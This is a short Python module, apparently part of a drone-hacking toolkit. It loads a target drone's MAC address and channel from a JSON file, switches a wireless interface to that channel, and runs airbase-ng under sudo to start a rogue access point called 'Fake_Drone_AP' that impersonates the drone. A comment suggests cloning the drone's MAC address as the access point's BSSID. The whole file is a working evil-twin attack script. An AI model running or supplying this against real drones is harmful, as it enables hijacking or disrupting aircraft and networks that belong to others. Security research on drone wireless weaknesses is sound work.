import os
import json
from src.utils import sudo_exec

##################
### PREP MODULE ##
##################

# Get path to project root directory (two levels up from this file)
target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
scan_info = None

# Intialize target drone data
with open(target_data_file, 'r') as file:
    scan_info = json.load(file)

target_info = scan_info.get("target_info", {})
target_mac = target_info.get("mac_address")
target_channel = target_info.get("channel")

options_info = scan_info.get("options", {})
packets = options_info.get("packets")
interface = options_info.get("interface")

# Temporary hardcoded SSID for fake AP (can be modified to read from input file if needed)
fake_ssid = "Fake_Drone_AP"

##################
## START MODULE ##
##################

# Targeting specific channel of target drone
sudo_exec(f"iwconfig {interface} channel {target_channel}")

# May want to use -a {target_mac} to specify BSSID of fake AP to match target drone's MAC address
# Airbase-ng command to create fake AP pretending to be drone
sudo_exec(f"airbase-ng -e {fake_ssid} -c {target_channel} {interface}")

# Potential alternative command to create ad-hoc network
# sudo_exec(f"airbase-ng --ad-hoc")
